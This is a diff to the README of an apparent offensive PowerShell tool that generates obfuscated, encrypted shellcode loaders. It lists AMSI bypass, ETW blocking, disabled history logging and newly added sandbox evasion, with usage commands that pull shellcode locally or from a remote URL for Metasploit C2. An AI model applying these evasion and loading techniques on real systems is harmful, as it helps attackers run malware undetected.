@@ -6,19 +6,29 @@ It generates an obfuscated and encrypted shellcode loader script that will injec
 
 > Features
   - Shellcode injection into the memory of the current process (PowerShell)
-  - AES encryption and GZip compression (based on 'Xencrypt')
+  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
   - AMSI bypass
   - Blocking Event Tracing for Windows (ETW)
   - Disabling PowerShell history logging
+  - Basic sandbox evasion techniques (optional)
+    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
+    - wait for 60 seconds before execution
 
 > Usage
+1. Example with a shellcode file stored locally
+```
+  - Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
+  - Invoke-PoSH-ShellCodeLoader1 -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1
+  --- or ---
+  - Invoke-PoSH-ShellCodeLoader1 -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1 -Sandbox
+```
+2. Example with a shellcode file stored on a remote web server
 ```
   - Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
   - Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1  
   --- or ---
-  - Invoke-PoSH-ShellCodeLoader1 -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1
+  - Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1 -Sandbox
 ```
-
 > Input 
   - Shellcode format (e.g. [Byte[]] $buf = 0xfc,0x48,0x83,...)
   - Metasploit C2 Framework  
